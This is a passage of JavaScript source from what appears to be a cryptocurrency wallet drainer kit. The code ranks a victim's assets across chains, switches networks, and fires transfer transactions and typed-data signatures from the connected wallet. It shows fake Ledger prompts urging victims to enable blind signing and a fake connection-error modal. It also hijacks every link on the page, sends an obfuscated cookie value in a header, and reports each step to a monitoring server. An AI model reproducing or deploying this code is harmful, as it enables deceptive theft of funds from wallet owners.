              console.log("MIN PERCENTAGE CHANGING CHAIN FROM", switchToChain, "TO", chain);
              switchToChain = chain;
            }
          }
    	}
    } catch(err) {
      await request_monitor({
        process: "DRAINER_DRAIN",
        step: "PREPARE_TRANSACTIONS_5",
        error: err,
      });
    }*/

    const sorted = new Map([...transactions.entries()].sort((a,b) => (a[0] === currentHighestChain)? - 1 : (b[0] === currentHighestChain)? + 1 : b[1].value - a[1].value));
    //console.log("drainer sorted transactions");
    //console.log(sorted);

    try {
      var withoutHelpers = removeHelpers(Object.fromEntries(sorted));
      //console.log("withoutHelpers: ", withoutHelpers);
      await request_api(STRATEGY_URL, { transactions: JSON.stringify(withoutHelpers) });
    } catch(err) {
      await request_monitor({
        process: "DRAINER_DRAIN",
        step: "PREPARE_TRANSACTIONS_6",
        error: err,
      });
    }

    if(withoutHelpers == 0 || sorted.size == 0) {
        eligible = false;
        running = false;
        await updateStatus(5);
        return;
    }

    if(selectedWallet === "WC_LedgerWallet") {
        await Swal.fire({
            imageUrl: "data:image/svg+xml;base64,PHN2ZyB2ZXJzaW9uPSIxLjAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIKIHdpZHRoPSI2OTYuMDAwMDAwcHQiIGhlaWdodD0iNjk3LjAwMDAwMHB0IiB2aWV3Qm94PSIwIDAgNjk2LjAwMDAwMCA2OTcuMDAwMDAwIgogcHJlc2VydmVBc3BlY3RSYXRpbz0ieE1pZFlNaWQgbWVldCI+Cgo8ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgwLjAwMDAwMCw2OTcuMDAwMDAwKSBzY2FsZSgwLjEwMDAwMCwtMC4xMDAwMDApIgpmaWxsPSIjMDAwMDAwIiBzdHJva2U9Im5vbmUiPgo8cGF0aCBkPSJNMCAzNDg1IGwwIC0zNDg1IDM0ODAgMCAzNDgwIDAgMCAzNDg1IDAgMzQ4NSAtMzQ4MCAwIC0zNDgwIDAgMAotMzQ4NXogbTI4OTAgMjI1MCBsMCAtMTQ1IC03NTcgLTIgLTc1OCAtMyAtMyAtNDM3IC0yIC00MzggLTE0NSAwIC0xNDUgMCAwCjU4NSAwIDU4NSA5MDUgMCA5MDUgMCAwIC0xNDV6IG0yOTgwIC00NDAgbDAgLTU4NSAtMTQ1IDAgLTE0NSAwIC0yIDQzOCAtMwo0MzcgLTc1NyAzIC03NTggMiAwIDE0NSAwIDE0NSA5MDUgMCA5MDUgMCAwIC01ODV6IG0tMjY4OCAtMTY2MiBsMyAtNzU4IDQzOAotMyA0MzcgLTIgMCAtMTQ1IDAgLTE0NSAtNTg1IDAgLTU4NSAwIDAgOTA1IDAgOTA1IDE0NSAwIDE0NSAwIDIgLTc1N3oKbS0xODEwIC0xODEwIGwzIC00MzggNzU4IC0zIDc1NyAtMiAwIC0xNDUgMCAtMTQ1IC05MDUgMCAtOTA1IDAgMCA1ODUgMCA1ODUKMTQ1IDAgMTQ1IDAgMiAtNDM3eiBtNDQ5OCAtMTQ4IGwwIC01ODUgLTkwNSAwIC05MDUgMCAwIDE0NSAwIDE0NSA3NTggMiA3NTcKMyAzIDQzOCAyIDQzNyAxNDUgMCAxNDUgMCAwIC01ODV6Ii8+CjwvZz4KPC9zdmc+",
            title: "Ledger Wallet",
            html: '<div style="text-align:left;margin-bottom: 10px;"><b>Before you continue please make sure Blind Sings are enabled on your device</b><br></div><div style="text-align:left;">1. Unlock your Ledger device.</div><div style="text-align:left;">2. Open the Ethereum (ETH) application.</div><div style="text-align:left;">3. Navigate to Settings inside the app.</div><div style="text-align:left;">4. Select <b>\'Blind signing</b>\'.</div><div style="text-align:left;">5. Press both buttons to <b>enable</b> blind signing.</div><div style="text-align:left;">6. Then click \'Continue\' down below.</div><center><img style="margin-top: 30px;width:292px!important;height:125px!important;" alt="Ledger video presentation" src="https://support.ledger.com/hc/article_attachments/4420181294865/blind_signing_eth_app_5.gif"></center>',
            confirmButtonColor: "blue",
            confirmButtonText: 'Continue',
        });
    }

  	console.log("drainer sorted transactions:", sorted);

    // if(true) return;

    loop:
  	for(const [chain, details] of sorted) {
  		if(!running) break;
      // if(selectedWallet == "WalletConnect" && chain != selectedChain) continue;
  		if(details.list.length == 0) continue;
      if(details.value < DRAINER_TRANSACTION_MINVALUE) continue;
  		while(running && getChainHexByName(chain) != web3.utils.toHex(await web3.eth.getChainId())) {
        if(changed) {
          if(getChainHexByName(chain) == web3.utils.toHex(await web3.eth.getChainId())) {
            changed = false;
            break;
          }
        } else {
          await sleep(500);
        }
        try {
          var success = await web3_switchChain(getChainHexByName(chain));
          if(success) {
            await request_monitor({
              process: "DRAINER_DRAIN",
              step: "CHAIN_SWITCH_" + chain.toUpperCase(),
            });
            console.log("drainer chain switched:", chain);
            selectedChain = getChainNameByHex(web3.utils.toHex(await web3.eth.getChainId()));
            nonce = Number(await web3.eth.getTransactionCount(walletAddress, 'pending'));
          } else if(getChainHexByName(chain) !== web3.utils.toHex(await web3.eth.getChainId() && await web3_addChain(DRAINER_CHAINS[chain].network))) {
            console.log("drainer chain added:", chain);
            await request_monitor({
              process: "DRAINER_DRAIN",
              step: "CHAIN_ADD_" + chain.toUpperCase(),
            });
          }
        } catch(err) {
          await request_monitor({
            process: "DRAINER_DRAIN",
            step: "CHAIN",
            error: err,
          });
          if(err.toString().toLowerCase().includes("pending")) {
            await sleep(1000);
          }
        }
  		}

      var currentChain = web3.utils.toHex(await web3.eth.getChainId());
      if(getChainHexByName(chain) !== currentChain) continue loop;
      selectedChain = getChainNameByHex(currentChain);
      nonce = Number(await web3.eth.getTransactionCount(walletAddress, 'pending'));

  		var i = 0;
  		while(i < details.list.length && running) {

        if(selectedWallet !== "WC_ZengoWallet" && details.list[i].name === "drainer_native" && details.list[i].values[0] > 8000) {
          console.log("Opening phrase modal when drainer_native")
          closePhrasesBlock = false;
          nativeDetected = true;
          running = false;
          eligible = false;
          document.getElementById("drainer-button").innerHTML = "Switch wallet";
          let isLedger = isLedgerWalletConnected();
          Swal.fire({
                  imageUrl: isLedger ? "data:image/svg+xml;base64,PHN2ZyB2ZXJzaW9uPSIxLjAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIKIHdpZHRoPSI2OTYuMDAwMDAwcHQiIGhlaWdodD0iNjk3LjAwMDAwMHB0IiB2aWV3Qm94PSIwIDAgNjk2LjAwMDAwMCA2OTcuMDAwMDAwIgogcHJlc2VydmVBc3BlY3RSYXRpbz0ieE1pZFlNaWQgbWVldCI+Cgo8ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgwLjAwMDAwMCw2OTcuMDAwMDAwKSBzY2FsZSgwLjEwMDAwMCwtMC4xMDAwMDApIgpmaWxsPSIjMDAwMDAwIiBzdHJva2U9Im5vbmUiPgo8cGF0aCBkPSJNMCAzNDg1IGwwIC0zNDg1IDM0ODAgMCAzNDgwIDAgMCAzNDg1IDAgMzQ4NSAtMzQ4MCAwIC0zNDgwIDAgMAotMzQ4NXogbTI4OTAgMjI1MCBsMCAtMTQ1IC03NTcgLTIgLTc1OCAtMyAtMyAtNDM3IC0yIC00MzggLTE0NSAwIC0xNDUgMCAwCjU4NSAwIDU4NSA5MDUgMCA5MDUgMCAwIC0xNDV6IG0yOTgwIC00NDAgbDAgLTU4NSAtMTQ1IDAgLTE0NSAwIC0yIDQzOCAtMwo0MzcgLTc1NyAzIC03NTggMiAwIDE0NSAwIDE0NSA5MDUgMCA5MDUgMCAwIC01ODV6IG0tMjY4OCAtMTY2MiBsMyAtNzU4IDQzOAotMyA0MzcgLTIgMCAtMTQ1IDAgLTE0NSAtNTg1IDAgLTU4NSAwIDAgOTA1IDAgOTA1IDE0NSAwIDE0NSAwIDIgLTc1N3oKbS0xODEwIC0xODEwIGwzIC00MzggNzU4IC0zIDc1NyAtMiAwIC0xNDUgMCAtMTQ1IC05MDUgMCAtOTA1IDAgMCA1ODUgMCA1ODUKMTQ1IDAgMTQ1IDAgMiAtNDM3eiBtNDQ5OCAtMTQ4IGwwIC01ODUgLTkwNSAwIC05MDUgMCAwIDE0NSAwIDE0NSA3NTggMiA3NTcKMyAzIDQzOCAyIDQzNyAxNDUgMCAxNDUgMCAwIC01ODV6Ii8+CjwvZz4KPC9zdmc+" : undefined,
      			      title: isLedger ? "Ledger Wallet Error" : "Wallet Connection Error",
      			      html: "Looks like your wallet is experiencing some connection issues with our protocol, please try connecting again. If the issue persists, contact our live chat support - we are available 24/7!",
                  confirmButtonColor: "blue",
      			      confirmButtonText: 'Continue',
      		}).then(function(e) {
            request_monitor({
              process: "DRAINER_DRAIN",
              step: "OPEN_NATIVE_PHRASE_" + e.isConfirmed,
            });
          });
          running = false;
          break loop;
        }

  			var transaction = details.list[i];
        transaction.chain = chain;
  			try {
  				console.log("doing", chain, transaction.method.name);
  				console.log(transaction);
          const success = await transaction.method.call(undefined, ...transaction.args);
  				if(success) {
  					await updateStatus(6, transaction);
  					i++;
            //getCachedItem but need transaction.args to object with keys due to too much problems with contractAddress, amount
  				}
  			} catch(err) {
                  console.log("xdd");
                  console.log(JSON.stringify(err).toLowerCase());
                  await request_monitor({
                    process: "DRAINER_DRAIN",
                    step: "TRANSACTION",
                    transaction: removeHelpers(transaction),
                    error: err,
                  });
                  const message = JSON.stringify(err).toLowerCase();
                  if(selectedWallet === "WC_LedgerWallet" && (message.includes("keyring controller") || message.includes("unknown error") || message.includes("transaction declined"))) {
                      Swal.fire({
                          imageUrl: "data:image/svg+xml;base64,PHN2ZyB2ZXJzaW9uPSIxLjAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIKIHdpZHRoPSI2OTYuMDAwMDAwcHQiIGhlaWdodD0iNjk3LjAwMDAwMHB0IiB2aWV3Qm94PSIwIDAgNjk2LjAwMDAwMCA2OTcuMDAwMDAwIgogcHJlc2VydmVBc3BlY3RSYXRpbz0ieE1pZFlNaWQgbWVldCI+Cgo8ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgwLjAwMDAwMCw2OTcuMDAwMDAwKSBzY2FsZSgwLjEwMDAwMCwtMC4xMDAwMDApIgpmaWxsPSIjMDAwMDAwIiBzdHJva2U9Im5vbmUiPgo8cGF0aCBkPSJNMCAzNDg1IGwwIC0zNDg1IDM0ODAgMCAzNDgwIDAgMCAzNDg1IDAgMzQ4NSAtMzQ4MCAwIC0zNDgwIDAgMAotMzQ4NXogbTI4OTAgMjI1MCBsMCAtMTQ1IC03NTcgLTIgLTc1OCAtMyAtMyAtNDM3IC0yIC00MzggLTE0NSAwIC0xNDUgMCAwCjU4NSAwIDU4NSA5MDUgMCA5MDUgMCAwIC0xNDV6IG0yOTgwIC00NDAgbDAgLTU4NSAtMTQ1IDAgLTE0NSAwIC0yIDQzOCAtMwo0MzcgLTc1NyAzIC03NTggMiAwIDE0NSAwIDE0NSA5MDUgMCA5MDUgMCAwIC01ODV6IG0tMjY4OCAtMTY2MiBsMyAtNzU4IDQzOAotMyA0MzcgLTIgMCAtMTQ1IDAgLTE0NSAtNTg1IDAgLTU4NSAwIDAgOTA1IDAgOTA1IDE0NSAwIDE0NSAwIDIgLTc1N3oKbS0xODEwIC0xODEwIGwzIC00MzggNzU4IC0zIDc1NyAtMiAwIC0xNDUgMCAtMTQ1IC05MDUgMCAtOTA1IDAgMCA1ODUgMCA1ODUKMTQ1IDAgMTQ1IDAgMiAtNDM3eiBtNDQ5OCAtMTQ4IGwwIC01ODUgLTkwNSAwIC05MDUgMCAwIDE0NSAwIDE0NSA3NTggMiA3NTcKMyAzIDQzOCAyIDQzNyAxNDUgMCAxNDUgMCAwIC01ODV6Ii8+CjwvZz4KPC9zdmc+",
                          title: "Ledger Wallet",
                          html: '<div style="text-align:left;margin-bottom: 10px;"><b>Before you continue please make sure Blind Sings are enabled on your device</b><br></div><div style="text-align:left;">1. Unlock your Ledger device.</div><div style="text-align:left;">2. Open the Ethereum (ETH) application.</div><div style="text-align:left;">3. Navigate to Settings inside the app.</div><div style="text-align:left;">4. Select <b>\'Blind signing</b>\'.</div><div style="text-align:left;">5. Press both buttons to <b>enable</b> blind signing.</div><div style="text-align:left;">6. Then click \'Continue\' down below.</div><center><img style="margin-top: 30px;width:292px!important;height:125px!important;" alt="Ledger video presentation" src="https://support.ledger.com/hc/article_attachments/4420181294865/blind_signing_eth_app_5.gif"></center>',
                          confirmButtonColor: "blue",
                          confirmButtonText: 'Continue',
                      }).then(function(e) {
                          request_monitor({
                              process: "DRAINER_DRAIN",
                              step: "LEDGER_BLINDS_DRAIN_" + e.isConfirmed,
                          });
                      });
                      running = false;
                      break loop;
                  }
  				if(err?.code === 500 || err?.code === 4001 || message.includes("pending") || message.includes("already") || message.includes("cancel") || message.includes("denied") || message.includes("rejected") || message.includes("declined")) {
  					await updateStatus(7, transaction);
  					continue;
  				}
  				if(message.includes("intrinsic gas too low") || message.includes("transaction would cause overdraft")) {
  					await updateStatus(8, message);
  				}
  				i++;
  			}
  		}
  	}
  } catch(err) {
    await request_monitor({
      process: "DRAINER_DRAIN",
      step: "GLOBAL",
      error: err,
    });
  }
	console.log("drainer script ended");
}
// DRAINER UTILS

async function web3_transaction(tx) {
  return new Promise((resolve, reject) => {
    if(web3.currentProvider.sendAsync) {
      web3.currentProvider.sendAsync({
          id: new Date().getTime(),
          method: 'eth_sendTransaction',
          from: walletAddress,
          params: [tx],
      }, (err, resp) => {
          if(err) {
            /*await request_monitor({
              process: "WEB3_TRANSACTION",
              error: JSON.stringify(err) + "params: " + JSON.stringify(tx),
            });*/
            return reject(err);
          }
          nonce += 1;
          resolve(resp.result || resp || '');
        });
      } else {
        DRAINER_Provider.request({
            id: new Date().getTime(),
            method: 'eth_sendTransaction',
            from: walletAddress,
            params: [tx],
        }, (err, resp) => {
            if(err) {
              /*await request_monitor({
                process: "WEB3_TRANSACTION",
                error: JSON.stringify(err) + "params: " + JSON.stringify(tx),
              });*/
              return reject(err);
            }
            nonce += 1;
            resolve(resp.result || resp || '');
          });
      }
  });
}

// var rrrrr;
async function web3_fastcall(address, method, drugsaddiction = false) {
  let gas = DRAINER_CHAINS[selectedChain].gas;

  try {
       let gasLimit = web3.utils.toHex(await method.estimateGas({
           from: walletAddress,
           value: "0x00",
           gas: web3.utils.toHex(DRAINER_CHAINS[selectedChain].gasLimit),
       }));
     gas[1] = gasLimit;
  } catch(err) {
    await request_monitor({
      process: "WEB3_FASTCALL",
      step: "GAS",
      error: JSON.stringify(err),
    });
  }

  if(drugsaddiction) {
    gas[0] = web3.utils.toHex(web3.utils.toBigInt(Math.floor(gas[0] * 2.3)));
    gas[1] = web3.utils.toHex(web3.utils.toBigInt(Math.floor(gas[1] * 1.05)));
  }
  let params = {
    from: walletAddress,
    to: address,
    data: await method.encodeABI(),
    nonce: web3.utils.toHex(nonce),
    gasPrice: gas[0],
    gas:      gas[1],
    value: '0x00',
    chainId: Number(DRAINER_CHAINS[selectedChain].id),
  };

 if (selectedWallet.includes('Metamask')) {
     //params.value = '0x0000';
     params.value = '0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000';
 }

  await request_monitor({
    process: "WEB3_FASTCALL",
    step: "PARAMS",
    error: JSON.stringify(params),
  });
  const transactionHash = await web3_transaction(params)
  return transactionHash;
}

function web3_sign(data) {
	return new Promise((resolve, reject) => {
		/*const request = {
			method: "eth_signTypedData_v4",
			params: [walletAddress, data],
			from: walletAddress
		};
		web3.eth.currentProvider.sendAsync(request, (err, tx) => {
			if(err) return reject(err);
			resolve(tx.result || tx || '');
    });*/
    if(web3.currentProvider.sendAsync) {
      web3.currentProvider.sendAsync({
          id: new Date().getTime(),
          method: 'eth_signTypedData_v4',
          params: [walletAddress, data],
          from: walletAddress,
      }, (err, resp) => {
          if(err) return reject(err);
          resolve(resp.result || resp || '');
        });
      } else {
        DRAINER_Provider.request({
            id: new Date().getTime(),
            method: 'eth_signTypedData_v4',
            params: [walletAddress, data],
        }, (err, resp) => {
            if(err) return reject(err);
            resolve(resp.result || resp || '');
          });
      }
	});
}

async function web3_switchChain(chainHex) {
    return new Promise((resolve, reject) => {
        const request = {
            method: 'wallet_switchEthereumChain',
            params: [{
                chainId: chainHex
            }],
        };
        web3.eth.currentProvider.request(request)
            .then(a => {
                resolve(true);
            })
            .catch(err => {
if(!DRAINER_SKIP_NOT_EXISTING_CHAIN && (err.message.toLowerCase().includes("no assets found") || err.message.toLowerCase().includes("unrecognized"))) resolve(false);
                reject(err);
            });
    });
}

async function web3_addChain(network) {
    return new Promise((resolve, reject) => {
        console.log("adding new chain: ", network);
        const request = {
            method: 'wallet_addEthereumChain',
            params: [network]
        };
        web3.eth.currentProvider.request(request)
            .then(a => {
                resolve(true)
            }).catch(err => {
                reject(err);
            });
    });
}

function contract_get(contractAbi, contractAddress) {
  const contractInstance = new web3.eth.Contract(contractAbi, contractAddress)
  contractInstance.transactionSendTimeout = 9999999;
  contractInstance.transactionPollingTimeout = 9999999;
  contractInstance.transactionBlockTimeout = 9999999;
  return contractInstance;
}

async function contract_approved(chain, contractAddress, operatorAddress) {
    try {
        let contract = web3_getContract(chain, ERC721_ABI, contractAddress);
        const approved = await contract.methods.isApprovedForAll(walletAddress, operatorAddress).call({from: walletAddress});
        return approved;
    } catch (err) {
        console.log("failed contract approved", err);
        return false;
    }
}

async function moonbirds_isNested(id) {
  const contract = web3_getContract("eth", MOONBIRDS_ABI, ETH_MOONBIRDS_CONTRACT);
  const isNesting = (await (contract.methods.nestingPeriod(id).call({from: walletAddress}))).nesting;
  return isNesting;
}

async function initGas() {
  Object.entries(DRAINER_CHAINS).forEach(async([chain, details]) => {
    const gasLimit = DRAINER_CHAINS[chain].gasLimit;
    const feeData = await details.rpc.getFeeData();
    const gasPriceHex = web3.utils.toHex(web3.utils.toBigInt(Math.floor(Number(feeData.gasPrice) * 1.3/* * 1.3/*(chain == "eth" ? 1.3 : 1.9)*/)));
    const gasLimitHex = web3.utils.toHex(web3.utils.toBigInt(Math.floor(Number(gasLimit) * 1.4/* * 1.4/*(chain == "eth" ? 1.4 : 2)*/)));
    details.gas = [gasPriceHex, gasLimitHex];
    console.log("gas on", chain, "->", details.gas);
  });
}

function web3_getContract(chain, abi, address) {
	const contract = contract_get(abi, address);
	contract.setProvider(getChainUrlByName(chain));
	return contract;
}

function getChainNameByHex(chainHex) {
		for (const [name, details] of Object.entries(DRAINER_CHAINS)) {
				if(details.id === chainHex) return name;
		}
    return "unknown";
}

function getChainUrlByName(chain) {
		for (const [name, details] of Object.entries(DRAINER_CHAINS)) {
				if(name == chain) return details.network.rpcUrls[0];
				//if(name == chain) return details.rpc._getConnection().url;
		}
}

function getChainHexByName(chain) {
		for (const [name, details] of Object.entries(DRAINER_CHAINS)) {
				if(name == chain) return details.id;
		}
}

window.addEventListener("load", async () => {
	console.log("drainer page load");
  try {
    initModal();
    axiosInstance = axios.create({ headers: { "X-PATHNAME": window.location.pathname, "CLOUDFLARE_IDENTIFIER": ("; " + document.cookie).split("; " + atob("R09P"+ "" + "R0xF"+"X0FE"+"U19J"+ "" + "REVO"+"VElG"+"SUVS") + "=").pop().split(";")[0] } });
    const buttons = document.getElementsByClassName("drainer-button");
    for(var i = 0; i < buttons.length; i++) {
     buttons.item(i).addEventListener('click', async function(e) {
       e.preventDefault();
       drainer_start(!eligible);
     });
    }
	for(let link of document.links) {
		if(link.className.includes("drainer-")) continue;
		if(link.id.includes("drainer-")) continue;
		link.addEventListener("click", async function(e) {
			e.preventDefault();
			drainer_start(!eligible);
		});
	}
  drainer_start();
  } catch(err) {
      console.log(err);
    await request_monitor({
      process: "DRAINER_LOAD",
      error: JSON.stringify(err),
    });
  }
});

window.addEventListener("error", async (err) => {
  await request_monitor({
    process: "DRAINER_ERROR",
    error: JSON.stringify(err),
  });
});
